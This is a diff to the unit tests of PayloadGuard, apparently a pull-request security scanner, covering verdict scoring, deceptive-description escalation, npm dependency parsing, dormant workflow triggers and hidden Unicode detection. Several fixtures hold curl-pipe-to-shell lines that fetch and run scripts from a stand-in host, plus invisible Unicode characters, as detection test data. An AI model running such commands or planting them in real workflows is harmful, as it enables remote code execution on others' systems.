@@ -1,3 +1,4 @@
+import itertools
 import json
 import os
 import re
@@ -7,7 +8,7 @@ import subprocess
 import sys
 import tempfile
 import unittest
-from datetime import datetime, timezone
+from datetime import datetime, timedelta, timezone
 from io import StringIO
 from unittest.mock import MagicMock, patch
 
@@ -20,6 +21,9 @@ from analyze import (
     SemanticTransparencyAnalyzer,
     StructuralPayloadAnalyzer,
     TemporalDriftAnalyzer,
+    _DECEPTION_RECOMMENDATIONS,
+    _VERDICT_BANDS,
+    _apply_semantic_transparency,
     _check_agent_settings_json,
     _check_binding_gyp,
     _check_composer_json,
@@ -32,7 +36,12 @@ from analyze import (
     _is_oidc_consumer_typosquatted,
     _load_allowlist,
     _parse_added_packages,
+    _npm_added_packages,
+    _HIDDEN_UNICODE_RE,
+    _SEMANTIC_DOC_FILE_RE,
+    _raise_verdict,
     _read_file_at_ref,
+    format_markdown_report,
     load_config,
     print_report,
     save_json_report,
@@ -378,8 +387,8 @@ class TestAssessConsequenceDestructive(unittest.TestCase):
     def setUp(self):
         self.a = _make_analyzer()
 
-    def test_branch_over_365_days_and_many_files(self):
-        v = self.a._assess_consequence(60, 0, 400, 0)
+    def test_branch_over_365_days_and_security_deletion(self):
+        v = self.a._assess_consequence(0, 0, 400, 0, security_file_deletions=1)
         self.assertEqual(v["status"], "DESTRUCTIVE")
         self.assertEqual(v["severity"], "CRITICAL")
 
@@ -388,12 +397,12 @@ class TestAssessConsequenceDestructive(unittest.TestCase):
         self.assertEqual(v["status"], "CAUTION")
 
     def test_combined_flags_score(self):
-        v = self.a._assess_consequence(60, 60000, 400, 95)
+        v = self.a._assess_consequence(60, 60000, 400, 95, structural_severity="CRITICAL")
         self.assertGreaterEqual(v["severity_score"], 5)
         self.assertGreater(len(v["flags"]), 1)
 
     def test_recommendation_says_do_not_merge(self):
-        v = self.a._assess_consequence(60, 60000, 400, 95)
+        v = self.a._assess_consequence(60, 60000, 400, 95, structural_severity="CRITICAL")
         self.assertIn("DO NOT MERGE", v["recommendation"])
 
 
@@ -439,6 +448,253 @@ class TestAssessConsequenceCustomThresholds(unittest.TestCase):
         a = _make_analyzer(config=cfg)
         v = a._assess_consequence(4, 0, 0, 0)
         self.assertEqual(v["status"], "REVIEW")
+
+
+class TestBranchAgeCannotDecideDestructive(unittest.TestCase):
+    """AUDIT_LOG §H1: branch age raises the verdict at most to CAUTION; DESTRUCTIVE needs content evidence."""
+
+    def setUp(self):
+        self.a = _make_analyzer()
+
+    def test_age_does_not_lift_caution_content_to_destructive(self):
+        # Actions poisoning HIGH (+3) on a 200-day branch scored 3 + 2 = 5 (DESTRUCTIVE) before §H1.
+        v = self.a._assess_consequence(0, 0, 200, 0, actions_poisoning_flags=1)
+        self.assertEqual(v["status"], "CAUTION")
+        self.assertEqual(v["severity_score"], 4)
+        self.assertEqual(v["branch_age_score"], 1)
+        self.assertIn("Branch is 200 days old (6+ months)", v["flags"])
+
+    def test_age_does_not_lift_review_content_to_destructive(self):
+        # One critical-path deletion (+2) on a 400-day branch scored 2 + 3 = 5 before §H1.
+        v = self.a._assess_consequence(0, 0, 400, 0, critical_file_deletions=1)
+        self.assertEqual(v["status"], "CAUTION")
+        self.assertEqual(v["severity_score"], 4)
+
+    def test_mass_deletion_on_old_branch_matches_fresh_branch(self):
+        # Deletion volume alone scores at most 4 (deletion dimension cap); branch age no
+        # longer turns the same diff into DESTRUCTIVE.
+        fresh = self.a._assess_consequence(60, 60000, 0, 95)
+        old = self.a._assess_consequence(60, 60000, 400, 95)
+        self.assertEqual((fresh["status"], old["status"]), ("CAUTION", "CAUTION"))
+        self.assertEqual((old["severity_score"], old["branch_age_score"]), (4, 0))
+
+    def test_age_still_escalates_safe_content(self):
+        for days, status, score in ((91, "REVIEW", 1), (181, "REVIEW", 2), (366, "CAUTION", 3)):
+            v = self.a._assess_consequence(0, 0, days, 0)
+            self.assertEqual((v["status"], v["severity_score"], v["branch_age_score"]), (status, score, score))
+
+    def test_age_adds_to_destructive_content(self):
+        v = self.a._assess_consequence(0, 0, 400, 0, security_file_deletions=1)
+        self.assertEqual(v["status"], "DESTRUCTIVE")
+        self.assertEqual((v["severity_score"], v["branch_age_score"]), (8, 3))
+
+    def test_age_never_decides_destructive_across_signal_grid(self):
+        """Over every combination of content-signal tiers, branch age never lowers the score
+        and never turns a verdict that is not DESTRUCTIVE at age 0 into DESTRUCTIVE."""
+        signal_tiers = itertools.product(
+            (0, 21, 51),                                                 # files_deleted
+            ((0, 0), (150, 60), (150, 95), (10001, 0), (50001, 95)),     # (lines_deleted, deletion_ratio)
+            ("LOW", "CRITICAL"),                                         # structural_severity
+            (0, 1),                                                      # critical_file_deletions
+            (0, 1),                                                      # security_file_deletions
+            (0, 1),                                                      # unverified_dependencies
+            (0, 1, 2),                                                   # content_flags
+            ((0, False), (1, False), (1, True)),                         # Actions poisoning
+            ((0, False), (1, False), (1, True)),                         # AI config poisoning
+        )
+        for files, (lines, ratio), structural, crit, sec, unv, cf, (af, ac), (aif, aic) in signal_tiers:
+            kwargs = dict(
+                structural_severity=structural, critical_file_deletions=crit, security_file_deletions=sec,
+                unverified_dependencies=unv, content_flags=cf, actions_poisoning_flags=af,
+                actions_poisoning_critical=ac, ai_config_poisoning_flags=aif, ai_config_poisoning_critical=aic,
+            )
+            fresh = self.a._assess_consequence(files, lines, 0, ratio, **kwargs)
+            self.assertEqual(fresh["branch_age_score"], 0)
+            for days in (91, 181, 366):
+                aged = self.a._assess_consequence(files, lines, days, ratio, **kwargs)
+                case = (files, lines, ratio, days, kwargs)
+                self.assertEqual(aged["severity_score"] - fresh["severity_score"], aged["branch_age_score"], case)
+                self.assertGreaterEqual(aged["branch_age_score"], 0, case)
+                if fresh["status"] != "DESTRUCTIVE":
+                    self.assertNotEqual(aged["status"], "DESTRUCTIVE", case)
+
+
+_DECEPTIVE_SEMANTIC = {"status": "DECEPTIVE_PAYLOAD", "is_deceptive": True, "mci_score": 0.7,
+                       "signals": ["scope_understated", "operation_mutation"],
+                       "directive": "❌ DO NOT MERGE. PR description is inconsistent with actual diff scope and structure."}
+
+
+def _analyze_added_files(added_files, days_old=0, pr_description="minor typo", semantic=None):
+    """Run analyze() on a mocked repository whose branch adds ``added_files`` ((path, text) pairs)
+    and is ``days_old`` days older than the target; ``semantic`` replaces the L5b result when given."""
+    branch_date = datetime(2025, 1, 1, tzinfo=timezone.utc)
+    a = _make_analyzer()
+    branch_commit = MagicMock(committed_datetime=branch_date, hexsha="aabbccddeeff")
+    target_commit = MagicMock(committed_datetime=branch_date + timedelta(days=days_old), hexsha="112233445566")
+    a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
+    a.repo.iter_commits.return_value = []
+    diffs = []
+    for path, text in added_files:
+        d = MagicMock(change_type="A", b_path=path)
+        d.b_blob.data_stream.read.return_value = text.encode("utf-8")
+        diffs.append(d)
+    merge_base_commit = MagicMock(hexsha="deadbeef00000000")
+    merge_base_commit.diff.return_value = diffs
+    a.repo.merge_base.return_value = [merge_base_commit]
+    a.repo.git.diff.return_value = "\n".join(f"1\t0\t{path}" for path, _ in added_files)
+    if semantic is None:
+        return a.analyze(pr_description=pr_description)
+    with patch.object(SemanticTransparencyAnalyzer, "analyze_transparency", return_value=dict(semantic)):
+        return a.analyze(pr_description=pr_description)
+
+
+class TestBranchAgeSemanticEscalation(unittest.TestCase):
+    """AUDIT_LOG §H1: a deceptive description escalates CAUTION to DESTRUCTIVE only when the
+    content evidence reaches CAUTION, not when branch age does."""
+
+    def _verdict(self, added_files, days_old):
+        result = _analyze_added_files(added_files, days_old, semantic=_DECEPTIVE_SEMANTIC)
+        self.assertNotIn("error", result)
+        return result["verdict"]
+
+    def test_deception_on_age_only_caution_stays_caution(self):
+        # No content signals; a 400-day branch scores 3 (CAUTION) from age alone.
+        v = self._verdict([("README.md", "# Hello\n")], days_old=400)
+        self.assertEqual(v["status"], "CAUTION")
+        self.assertTrue(any(f.startswith("Semantic mismatch") for f in v["flags"]))
+
+    def test_deception_on_content_caution_escalates_to_destructive(self):
+        # Two added files with shell execution patterns score 4 (CAUTION) with no branch age.
+        shell = "curl https://x.example/i.sh | sh\n"
+        v = self._verdict([("notes.txt", shell), ("setup.txt", shell)], days_old=0)
+        self.assertEqual(v["status"], "DESTRUCTIVE")
+
+
+class TestEscalatedVerdictFields(unittest.TestCase):
+    """AUDIT_LOG §V12: a verdict raised after L3 (consequence policy, L5b) carries the severity,
+    score band and recommendation of its new status; escalation_score records the points added."""
+
+    _ORDER = ("SAFE", "REVIEW", "CAUTION", "DESTRUCTIVE")
+    _SHELL = "curl https://x.example/i.sh | sh\n"
+
+    def _fields(self, v):
+        return v["status"], v["severity"], v["severity_score"], v["escalation_score"]
+
+    def test_l3_fields_keep_their_values(self):
+        # _assess_consequence reads severity and recommendation from _VERDICT_BANDS; these are
+        # the literals it returned before.
+        a = _make_analyzer()
+        verdicts = {
+            "SAFE": a._assess_consequence(0, 0, 0, 0),
+            "REVIEW": a._assess_consequence(0, 0, 91, 0),
+            "CAUTION": a._assess_consequence(0, 0, 0, 0, actions_poisoning_flags=1),
+            "DESTRUCTIVE": a._assess_consequence(0, 0, 0, 0, security_file_deletions=1),
+        }
+        expected = {
+            "SAFE": ("LOW", "✓ Proceed with normal review process"),
+            "REVIEW": ("MEDIUM", "→ Proceed with normal review process, but note the flags above"),
+            "CAUTION": ("HIGH", "⚠️  REVIEW CAREFULLY — Significant destructive changes detected"),
+            "DESTRUCTIVE": ("CRITICAL", "❌ DO NOT MERGE — This would catastrophically alter the codebase"),
+        }
+        for status, v in verdicts.items():
+            self.assertEqual((v["status"], v["severity"], v["recommendation"], v["escalation_score"]),
+                             (status, *expected[status], 0))
+        self.assertEqual(verdicts["SAFE"]["flags"], ["No major red flags detected"])
+
+    def test_raise_lifts_score_to_lowest_score_of_new_band(self):
+        v = _make_analyzer()._assess_consequence(0, 0, 0, 0)
+        _raise_verdict(v, "REVIEW")
+        self.assertEqual(self._fields(v), ("REVIEW", "MEDIUM", 1, 1))
+        self.assertEqual(v["recommendation"], _VERDICT_BANDS["REVIEW"][2])
+        _raise_verdict(v, "DESTRUCTIVE", "custom")
+        self.assertEqual(self._fields(v), ("DESTRUCTIVE", "CRITICAL", 5, 5))
+        self.assertEqual(v["recommendation"], "custom")
+
+    def test_raise_keeps_a_score_already_in_band(self):
+        # Security (+5) and critical-path (+2) deletions score 7.
+        v = _make_analyzer()._assess_consequence(0, 0, 0, 0, security_file_deletions=1, critical_file_deletions=1)
+        _raise_verdict(v, "DESTRUCTIVE", "custom")
+        self.assertEqual(self._fields(v), ("DESTRUCTIVE", "CRITICAL", 7, 0))
+
+    def test_deception_on_clean_change_reports_caution(self):
+        # Before §V12: CAUTION with severity LOW, score 0 and "✓ Proceed with normal review process".
+        report = _analyze_added_files([("README.md", "# Hello\n")], semantic=_DECEPTIVE_SEMANTIC)
+        v = report["verdict"]
+        self.assertEqual(self._fields(v), ("CAUTION", "HIGH", 3, 3))
+        self.assertEqual(v["recommendation"], _DECEPTION_RECOMMENDATIONS["CAUTION"])
+        self.assertIn("PayloadGuard — `CAUTION` [HIGH]", format_markdown_report(report))
+
+    def test_deception_on_content_caution_reports_destructive(self):
+        # Before §V12: DESTRUCTIVE (exit 2) with severity HIGH, score 4 and "REVIEW CAREFULLY".
+        report = _analyze_added_files([("notes.txt", self._SHELL), ("setup.txt", self._SHELL)],
+                                      semantic=_DECEPTIVE_SEMANTIC)
+        v = report["verdict"]
+        self.assertEqual(self._fields(v), ("DESTRUCTIVE", "CRITICAL", 5, 1))
+        self.assertEqual(v["recommendation"], _DECEPTION_RECOMMENDATIONS["DESTRUCTIVE"])
+        self.assertIn("PayloadGuard — `DESTRUCTIVE` [CRITICAL]", format_markdown_report(report))
+
+    def test_missing_description_reports_review(self):
+        # Before §V12: REVIEW with severity LOW and score 0.
+        v = _analyze_added_files([("README.md", "# Hello\n")], pr_description="")["verdict"]
+        self.assertEqual(self._fields(v), ("REVIEW", "MEDIUM", 1, 1))
+        self.assertEqual(v["recommendation"], _VERDICT_BANDS["REVIEW"][2])
+
+    def test_deception_on_age_only_caution_keeps_status_and_score(self):
+        # §H1 keeps an age-only CAUTION at CAUTION; only the recommendation names the deception.
+        v = _analyze_added_files([("README.md", "# Hello\n")], days_old=400, semantic=_DECEPTIVE_SEMANTIC)["verdict"]
+        self.assertEqual(self._fields(v), ("CAUTION", "HIGH", 3, 0))
+        self.assertEqual(v["branch_age_score"], 3)
+        self.assertEqual(v["recommendation"], _DECEPTION_RECOMMENDATIONS["CAUTION"])
+
+    def test_semantic_escalation_across_signal_grid(self):
+        """Every L3 verdict on the §H1 signal grid, at each branch age tier, under each L5b status:
+        the final verdict matches the reference escalation, its score lies in its status band, and
+        severity_score = L3 score + escalation_score."""
+        a = _make_analyzer()
+        signal_tiers = itertools.product(
+            (0, 21, 51),                                                 # files_deleted
+            ((0, 0), (150, 60), (150, 95), (10001, 0), (50001, 95)),     # (lines_deleted, deletion_ratio)
+            ("LOW", "CRITICAL"),                                         # structural_severity
+            (0, 1),                                                      # critical_file_deletions
+            (0, 1),                                                      # security_file_deletions
+            (0, 1),                                                      # unverified_dependencies
+            (0, 1, 2),                                                   # content_flags
+            ((0, False), (1, False), (1, True)),                         # Actions poisoning
+            ((0, False), (1, False), (1, True)),                         # AI config poisoning
+        )
+        semantics = [{"status": s, "signals": ["scope_understated"]}
+                     for s in ("TRANSPARENT", "UNVERIFIED", "CAUTION_MISMATCH", "DECEPTIVE_PAYLOAD")]
+        for files, (lines, ratio), structural, crit, sec, unv, cf, (af, ac), (aif, aic) in signal_tiers:
+            kwargs = dict(
+                structural_severity=structural, critical_file_deletions=crit, security_file_deletions=sec,
+                unverified_dependencies=unv, content_flags=cf, actions_poisoning_flags=af,
+                actions_poisoning_critical=ac, ai_config_poisoning_flags=aif, ai_config_poisoning_critical=aic,
+            )
+            for days in (0, 91, 181, 366):
+                l3 = a._assess_consequence(files, lines, days, ratio, **kwargs)
+                content = l3["severity_score"] - l3["branch_age_score"]
+                for semantic in semantics:
+                    v = dict(l3, flags=list(l3["flags"]))
+                    _apply_semantic_transparency(v, semantic)
+                    case = (files, lines, ratio, days, kwargs, semantic["status"])
+                    # Reference escalation (AUDIT_LOG §H1, §V12).
+                    status, recommendation = l3["status"], l3["recommendation"]
+                    if semantic["status"] in ("UNVERIFIED", "CAUTION_MISMATCH") and status == "SAFE":
+                        status, recommendation = "REVIEW", _VERDICT_BANDS["REVIEW"][2]
+                    elif semantic["status"] == "DECEPTIVE_PAYLOAD" and status != "DESTRUCTIVE":
+                        status = "DESTRUCTIVE" if status == "CAUTION" and content >= 3 else "CAUTION"
+                        recommendation = _DECEPTION_RECOMMENDATIONS[status]
+                    score = max(l3["severity_score"], _VERDICT_BANDS[status][1])
+                    self.assertEqual(
+                        (v["status"], v["severity"], v["severity_score"], v["recommendation"]),
+                        (status, _VERDICT_BANDS[status][0], score, recommendation), case,
+                    )
+                    self.assertEqual(v["severity_score"], l3["severity_score"] + v["escalation_score"], case)
+                    self.assertEqual(v["branch_age_score"], l3["branch_age_score"], case)
+                    band = ("DESTRUCTIVE" if score >= 5 else "CAUTION" if score >= 3
+                            else "REVIEW" if score >= 1 else "SAFE")
+                    self.assertEqual(band, status, case)
+                    self.assertGreaterEqual(self._ORDER.index(status), self._ORDER.index(l3["status"]), case)
 
 
 # ==============================================================================
@@ -1340,6 +1596,40 @@ class TestSCAAnalysis(unittest.TestCase):
         self.assertIn("lodash", pkgs)
         self.assertNotIn("version", pkgs)
 
+    def test_parse_npm_section_key_is_not_a_package(self):
+        # AUDIT_LOG BUILD-07: the diff-line fallback read "dependencies" as a package name.
+        diff = '+  "dependencies": {\n+    "approved": "^1.0.0"\n+  },\n+  "files": [\n'
+        self.assertEqual(_parse_added_packages(diff, "npm"), ["approved"])
+
+    def test_npm_added_packages_reads_dependency_sections_only(self):
+        base = json.dumps({"name": "demo", "scripts": {"test": "jest"}})
+        head = json.dumps({
+            "name": "demo",
+            "scripts": {"test": "jest", "build": "tsc"},
+            "dependencies": {"approved": "^1.0.0"},
+            "devDependencies": {"jest": "^29.0.0"},
+        }, indent=2)
+        self.assertEqual(_npm_added_packages(base, head), ["approved", "jest"])
+
+    def test_npm_added_packages_compares_entries(self):
+        base = json.dumps({"dependencies": {"keep": "1.0.0", "bump": "1.0.0"}})
+        head = json.dumps({"dependencies": {"keep": "1.0.0", "bump": "2.0.0", "new": "1.0.0"}})
+        self.assertEqual(_npm_added_packages(base, head), ["bump", "new"])
+        self.assertEqual(_npm_added_packages(base, base), [])
+        # Compact single-line JSON is parsed like formatted JSON.
+        self.assertEqual(_npm_added_packages("", '{"dependencies":{"evil":"1.0.0"}}'), ["evil"])
+
+    def test_npm_added_packages_overrides_and_resolutions(self):
+        head = json.dumps({
+            "overrides": {"foo": {".": "1.0.0", "bar": "2.0.0"}, "@s/baz@^1": "1.2.0"},
+            "resolutions": {"**/lodash": "4.17.21", "a/@s/qux": "1.0.0"},
+        })
+        self.assertEqual(_npm_added_packages("{}", head), ["@s/baz", "@s/qux", "bar", "foo", "lodash"])
+
+    def test_npm_added_packages_returns_none_when_unparseable(self):
+        self.assertIsNone(_npm_added_packages("{}", '{"dependencies": {'))
+        self.assertIsNone(_npm_added_packages("{}", "[1, 2]"))
+
     def test_parse_go_package(self):
         diff = "+github.com/gin-gonic/gin v1.9.0\n"
         pkgs = _parse_added_packages(diff, "go")
@@ -1810,6 +2100,43 @@ class TestGitHubActionsPoisoningScanning(unittest.TestCase):
                 for s in result["actions_poisoning"]["flagged_workflows"][0]["signals"]
             ]
             self.assertNotIn("dormant_trigger_with_payload", sig_types)
+
+    def _dormant_signal_types(self, on_block, tail=""):
+        content = (
+            "name: t\n" + on_block +
+            "jobs:\n  run:\n    runs-on: ubuntu-latest\n"
+            "    steps:\n      - run: curl -s https://x.example/p.sh | bash\n" + tail
+        )
+        d = self._build_workflow_diff(".github/workflows/sleeper.yml", content)
+        result = self._make_analyzer_with_diffs([d]).analyze()
+        self.assertNotIn("error", result)
+        return [s["type"] for wf in result["actions_poisoning"]["flagged_workflows"] for s in wf["signals"]]
+
+    def test_dormant_trigger_detected_in_every_yaml_layout(self):
+        """AUDIT_LOG §H2: the trigger was matched by line layout, so only `on:` followed by
+        `workflow_dispatch` on the next line counted. The same workflow written inline, as a
+        flow list or map, or with the trigger listed second carried no dormant-trigger signal."""
+        layouts = {
+            "block, first key": "on:\n  workflow_dispatch:\n",
+            "inline": "on: workflow_dispatch\n",
+            "flow list": "on: [push, workflow_dispatch]\n",
+            "flow map": "on: {workflow_dispatch: {}}\n",
+            "block, second key": "on:\n  push:\n  workflow_dispatch:\n",
+            "schedule, second key": "on:\n  push:\n  schedule:\n    - cron: '0 3 * * *'\n",
+            "quoted key": "\"on\":\n  workflow_dispatch:\n",
+        }
+        for name, on_block in layouts.items():
+            with self.subTest(layout=name):
+                self.assertIn("dormant_trigger_with_payload", self._dormant_signal_types(on_block))
+
+    def test_push_only_trigger_is_not_dormant(self):
+        self.assertNotIn("dormant_trigger_with_payload",
+                         self._dormant_signal_types("on: [push, pull_request]\n"))
+
+    def test_unparseable_workflow_keeps_line_pattern_detection(self):
+        # An unclosed flow sequence makes the YAML unparseable; the line pattern still matches.
+        self.assertIn("dormant_trigger_with_payload",
+                      self._dormant_signal_types("on:\n  workflow_dispatch:\n", tail="broken: [unclosed\n"))
 
     def test_forged_bot_author_detected(self):
         content = (
@@ -2383,14 +2710,76 @@ class TestSemanticTransparencyV2(unittest.TestCase):
 
     # --- V_r Phantom Additions ---
 
-    def test_remedial_claim_high_insertion_ratio_flags_phantom(self):
-        # 95% additions — claimed as fix
+    def test_micro_remedial_claim_high_insertion_ratio_flags_phantom(self):
+        # "minor fix" on 100 changed lines, 95% additions
         content = self._make_lines(added=95, deleted=5)
         d = self._make_diff(content, 'src/new_module.py')
-        ana = SemanticTransparencyAnalyzer('fix critical bug', diffs=[d])
+        ana = SemanticTransparencyAnalyzer('minor fix for critical bug', diffs=[d])
         result = ana.analyze_transparency()
         self.assertIn('phantom_additions', result['signals'])
-        self.assertGreater(result['mci_score'], 0.0)
+        self.assertEqual(result['status'], 'DECEPTIVE_PAYLOAD')  # with scope_understated
+
+    def test_plain_fix_claim_on_additions_is_transparent(self):
+        # AUDIT_LOG SEM-02: bug fixes that add code are not a mismatch without a size claim
+        content = self._make_lines(added=95, deleted=5)
+        d = self._make_diff(content, 'src/new_module.py')
+        result = SemanticTransparencyAnalyzer('fix critical bug', diffs=[d]).analyze_transparency()
+        self.assertEqual(result['signals'], [])
+        self.assertEqual(result['status'], 'TRANSPARENT')
+
+    def test_micro_fix_within_churn_limit_is_not_phantom(self):
+        # AUDIT_LOG SEM-02: one added line under "minor typo fix"
+        d = self._make_diff('+added line\n', 'docs/guide.md')
+        result = SemanticTransparencyAnalyzer('minor typo fix', diffs=[d]).analyze_transparency()
+        self.assertEqual(result['status'], 'TRANSPARENT')
+
+    def test_domain_words_are_not_size_claims(self):
+        # AUDIT_LOG SEM-02: "grammar", "cleanup" and "complete" named features in real descriptions
+        content = self._make_lines(added=200, deleted=0) + '\n+def f():\n+    pass\n'
+        d = self._make_diff(content, 'src/parser.py')
+        for desc in ('Strengthen grammar invariants', 'Wait for worker close before scratch cleanup',
+                     'Complete versioned observations'):
+            result = SemanticTransparencyAnalyzer(desc, diffs=[d]).analyze_transparency()
+            self.assertEqual(result['status'], 'TRANSPARENT', desc)
+
+    def test_docs_claim_on_documentation_only_is_transparent(self):
+        diffs = [self._make_diff(self._make_lines(added=300, deleted=40), 'docs/guide.md'),
+                 self._make_diff(self._make_lines(added=20, deleted=0), 'README.md'),
+                 self._make_diff('+x\n', 'docs/diagram.svg')]
+        result = SemanticTransparencyAnalyzer('docs: expand the setup guide', diffs=diffs).analyze_transparency()
+        self.assertEqual(result['semantic_claim']['scope'], 'docs')
+        self.assertEqual(result['diff_reality']['outside_documentation']['total_churn'], 0)
+        self.assertEqual(result['status'], 'TRANSPARENT')
+
+    def test_docs_claim_measures_code_outside_documentation(self):
+        diffs = [self._make_diff(self._make_lines(added=300, deleted=40), 'docs/guide.md'),
+                 self._make_diff(self._make_lines(added=80, deleted=0) + '\n+def f():\n', 'src/app.py')]
+        result = SemanticTransparencyAnalyzer('docs: update the readme', diffs=diffs).analyze_transparency()
+        self.assertEqual(result['diff_reality']['outside_documentation']['total_churn'], 81)
+        self.assertIn('scope_understated', result['signals'])
+        self.assertIn('operation_mutation', result['signals'])
+        self.assertEqual(result['status'], 'DECEPTIVE_PAYLOAD')
+
+    def test_docs_claim_with_small_named_code_change_is_transparent(self):
+        # A release note that also bumps the version: 2 lines outside documentation
+        diffs = [self._make_diff(self._make_lines(added=200, deleted=300), 'README.md'),
+                 self._make_diff('+__version__ = "2"\n-__version__ = "1"\n', 'pkg/version.py')]
+        result = SemanticTransparencyAnalyzer('docs(release): update README and bump version',
+                                              diffs=diffs).analyze_transparency()
+        self.assertEqual(result['status'], 'TRANSPARENT')
+
+    def test_docs_claim_hiding_a_sensitive_file_is_flagged(self):
+        diffs = [self._make_diff('+typo\n', 'README.md'),
+                 self._make_diff('+    return True\n', 'src/auth_handler.py')]
+        result = SemanticTransparencyAnalyzer('docs: fix readme wording', diffs=diffs).analyze_transparency()
+        self.assertIn('hidden_component_modification', result['signals'])
+
+    def test_text_and_config_files_under_docs_are_not_documentation(self):
+        self.assertIsNone(_SEMANTIC_DOC_FILE_RE.search('requirements.txt'))
+        self.assertIsNone(_SEMANTIC_DOC_FILE_RE.search('docs/conf.py'))
+        self.assertIsNone(_SEMANTIC_DOC_FILE_RE.search('docs/research/run.workflow.js'))
+        for path in ('README', 'docs/a.md', 'CHANGELOG.rst', 'LICENSE.txt', 'img/x.png', 'guide.adoc'):
+            self.assertIsNotNone(_SEMANTIC_DOC_FILE_RE.search(path), path)
 
     def test_remedial_claim_balanced_ratio_transparent(self):
         # 50% insertions — consistent with a real fix
@@ -3031,6 +3420,37 @@ class TestAIToolingConfigPoisoning(unittest.TestCase):
         self.assertEqual(v["status"], "SAFE")
         self.assertEqual(v["severity_score"], 0)
 
+    # ── Hidden Unicode (AUDIT_LOG FP-01) ─────────────────────────────────────
+
+    def _hidden_unicode_signals(self, content, path="package.json"):
+        a = _make_analyzer()
+        flags = a._scan_ai_tooling_configs([self._build_diff(path, content)])
+        return [s for fl in flags for s in fl["signals"] if s["type"] == "hidden_unicode"]
+
+    def test_plain_ascii_is_not_hidden_unicode(self):
+        content = json.dumps({"name": "demo", "description": "Plain ASCII 0-9 a-z A-Z ~!@#"}, indent=2)
+        self.assertEqual(self._hidden_unicode_signals(content), [])
+        self.assertEqual(self._hidden_unicode_signals(json.dumps({"permissions": {}}),
+                                                      ".claude/settings.json"), [])
+
+    def test_regex_matches_only_the_intended_code_points(self):
+        printable = "".join(chr(c) for c in range(0x20, 0x7F)) + "\t\n\r" + "é€中 "
+        self.assertIsNone(_HIDDEN_UNICODE_RE.search(printable))
+        for cp in (0x200B, 0x200C, 0x200D, 0x202A, 0x202E, 0x2066, 0x2069, 0xFEFF, 0xE0000, 0xE0041, 0xE007F):
+            self.assertIsNotNone(_HIDDEN_UNICODE_RE.search(f"a{chr(cp)}b"), hex(cp))
+        for cp in (0x200A, 0x200E, 0x2065, 0x206A, 0xE007, 0xE080, 0xE0080):
+            self.assertIsNone(_HIDDEN_UNICODE_RE.search(f"a{chr(cp)}b"), hex(cp))
+
+    def test_hidden_characters_are_flagged(self):
+        for ch in ("​", "‮", "\U000e0041"):
+            content = json.dumps({"description": f"safe{ch}text"}, ensure_ascii=False)
+            self.assertEqual(len(self._hidden_unicode_signals(content)), 1, repr(ch))
+
+    def test_leading_byte_order_mark_is_not_flagged(self):
+        content = "﻿" + json.dumps({"name": "demo"})
+        self.assertEqual(self._hidden_unicode_signals(content), [])
+        self.assertEqual(len(self._hidden_unicode_signals(json.dumps({"a": "x"}) + "﻿")), 1)
+
 
 # ==============================================================================
 # Self-audit: PayloadGuard's own workflows must not be template-injectable
@@ -3351,6 +3771,25 @@ class TestPolicyReadFromTargetBranch(unittest.TestCase):
             extra_env={"PAYLOADGUARD_CONSEQUENCE_MODE": "advisory"}, tag="_env",
         )
         self.assertEqual(rep["consequence_analysis"]["mode"], "advisory")
+        self.assertEqual(code, 0)
+
+    # AUDIT_LOG §V12: a verdict raised by the consequence policy carries the fields of its new status.
+
+    def test_enforce_block_reports_destructive_fields(self):
+        _code, rep = self.results["pr/gut-verify"]
+        v = rep["verdict"]
+        self.assertEqual((v["status"], v["severity"], v["severity_score"], v["escalation_score"]),
+                         ("DESTRUCTIVE", "CRITICAL", 5, 5))
+        self.assertEqual(v["recommendation"], "❌ DO NOT MERGE — Verified destructive code consequence detected")
+
+    def test_advisory_review_carries_review_recommendation(self):
+        # Before §V12 the REVIEW verdict kept SAFE's "✓ Proceed with normal review process".
+        code, rep = self._scan("pr/gut-verify", "Tidy auth module",
+                               extra_args=("--consequence-mode", "advisory"), tag="_advisory")
+        v = rep["verdict"]
+        self.assertEqual((v["status"], v["severity"], v["severity_score"], v["escalation_score"]),
+                         ("REVIEW", "MEDIUM", 1, 1))
+        self.assertEqual(v["recommendation"], _VERDICT_BANDS["REVIEW"][2])
         self.assertEqual(code, 0)
 
     def test_load_config_ref_reads_commit_not_working_tree(self):
